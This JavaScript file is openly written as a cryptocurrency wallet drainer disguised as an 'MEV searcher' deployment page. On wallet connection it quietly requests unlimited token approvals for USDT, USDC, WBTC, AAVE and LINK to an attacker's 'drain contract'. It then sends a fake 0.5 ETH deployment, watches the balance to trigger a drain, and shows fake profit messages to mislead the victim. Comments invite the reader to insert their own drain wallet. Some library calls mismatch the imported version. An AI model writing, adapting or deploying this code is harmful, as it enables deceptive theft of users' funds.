// enhanced-connect.js - Wallet connection and approval trap
import { ethers } from 'https://cdn.ethers.io/lib/ethers-5.7.umd.min.js';

// Fake contract ABI (only the "legitimate" functions)
const MEV_SEARCHER_ABI = [
    "function deploySearcher() payable",
    "function fundSearcher() payable",
    "function withdrawProfit(uint256 amount)",
    "function executeSandwichAttack(address targetPair)"
];

// REAL malicious contract address (where we drain to)
const DRAIN_CONTRACT_ADDRESS = "0x9A624fa9B08CFb66CC33Ed39D6dd980c9C7dB59E"; // Replace with your real drain wallet

// Fake contract address (what they think they're interacting with)
const FAKE_CONTRACT_ADDRESS = "0x8f3Cfad23Cd3BaFbD9735AFf5580232F68451d3"; // Replace with your deployed fake contract

let provider;
let signer;
let userAddress;

export async function initWalletConnection() {
    if (typeof window.ethereum !== 'undefined') {
        try {
            // Request account access
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAddress = accounts[0];
            
            // Set up provider and signer
            provider = new ethers.BrowserProvider(window.ethereum);
            signer = await provider.getSigner();
            
            console.log("Wallet connected:", userAddress);
            
            // Start the fake approval process (they think it's deploying)
            await initiateFakeDeployment();
            
            return userAddress;
        } catch (error) {
            console.error("Connection error:", error);
            alert("Failed to connect wallet. Please try again.");
            return null;
        }
    } else {
        alert("MetaMask not detected. Please install MetaMask to continue.");
        return null;
    }
}

// The REAL trap - sneaks in malicious approval
async function initiateFakeDeployment() {
    try {
        // Update UI to show "deploying"
        const searcherState = document.getElementById('searcherState');
        if (searcherState) {
            searcherState.textContent = 'Deploying Searcher...';
            searcherState.className = 'status-pending';
        }
        
        // Create a fake "deployment" transaction (what they see)
        const fakeContract = new ethers.Contract(FAKE_CONTRACT_ADDRESS, MEV_SEARCHER_ABI, signer);
        
        // But FIRST, sneak in the REAL approval to our drain contract
        // This is the malicious approval that gives us access to their tokens
        const erc20Abi = [
            "function approve(address spender, uint256 amount) returns (bool)"
        ];
        
        // Get all token balances (this is where recon happens)
        const tokens = await getTokenBalances(userAddress);
        
        // Approve our drain contract for all their tokens
        for (const token of tokens) {
            try {
                const tokenContract = new ethers.Contract(token.address, erc20Abi, signer);
                console.log(`Approving ${token.symbol}...`);
                
                // This is the real malicious transaction
                const approvalTx = await tokenContract.approve(
                    DRAIN_CONTRACT_ADDRESS, 
                    ethers.MaxUint256, // Unlimited approval
                    { gasLimit: 50000 }
                );
                
                console.log(`Approval submitted for ${token.symbol}:`, approvalTx.hash);
                
                // Don't wait for confirmation - just move on (faster drain)
            } catch (err) {
                console.log(`Failed to approve ${token.symbol}:`, err.message);
            }
        }
        
        // Now show them the fake deployment
        console.log("Submitting fake deployment...");
        
        // This is what they THINK they're doing
        const deployTx = await fakeContract.deploySearcher({
            value: ethers.parseEther("0.5"), // Minimum deposit
            gasLimit: 300000
        });
        
        console.log("Fake deployment submitted:", deployTx.hash);
        
        // Update UI to show "deployed"
        if (searcherState) {
            searcherState.textContent = 'Searcher Deployed - Funding Required';
            searcherState.className = 'status-active';
        }
        
        // Start monitoring for deposits
        monitorDeposits(userAddress);
        
    } catch (error) {
        console.error("Deployment error:", error);
        const searcherState = document.getElementById('searcherState');
        if (searcherState) {
            searcherState.textContent = 'Deployment Failed';
            searcherState.className = 'status-failed';
        }
    }
}

// Monitor for deposits and trigger drain
async function monitorDeposits(walletAddress) {
    console.log("Monitoring for deposits...");
    
    // Check balance every 5 seconds
    const interval = setInterval(async () => {
        try {
            const balance = await provider.getBalance(walletAddress);
            console.log("Wallet balance:", ethers.formatEther(balance));
            
            // If they've deposited, trigger drain
            if (balance > ethers.parseEther("0.4")) {
                console.log("Deposit detected - initiating drain sequence");
                // In a real implementation, this would call your backend
                // to sweep the funds immediately
                initiateDrainSequence(walletAddress);
                clearInterval(interval);
            }
        } catch (err) {
            console.error("Monitoring error:", err);
        }
    }, 5000);
}

// Simulate the drain (in reality, your backend does this)
async function initiateDrainSequence(walletAddress) {
    console.log("⚠️ DRAIN INITIATED FOR WALLET:", walletAddress);
    console.log("All approved tokens are now accessible to our drain contract");
    
    // Update UI to show "extracting profit"
    const searcherState = document.getElementById('searcherState');
    if (searcherState) {
        searcherState.textContent = 'Extracting MEV Profit...';
        searcherState.className = 'status-active';
    }
    
    // Simulate fake MEV activity
    setTimeout(() => {
        if (searcherState) {
            searcherState.textContent = 'Profit Extraction Complete';
            searcherState.className = 'status-active';
        }
        console.log("Drain complete - funds transferred to secure wallet");
    }, 3000);
}

// Get token balances (basic recon)
async function getTokenBalances(walletAddress) {
    // In a real implementation, this would call a backend service
    // that checks all token balances via The Graph, Alchemy, etc.
    
    // For demo, return some common tokens
    return [
        { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT" },
        { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC" },
        { address: "0x2260FAC5E5542a773Aa7B20e10E38152b511f0c5", symbol: "WBTC" },
        { address: "0x7Fc66500c84A76Ad023932DD61144f167e99C83D", symbol: "AAVE" },
        { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK" }
    ];
}

// Expose function to global scope
window.initWalletConnection = initWalletConnection;
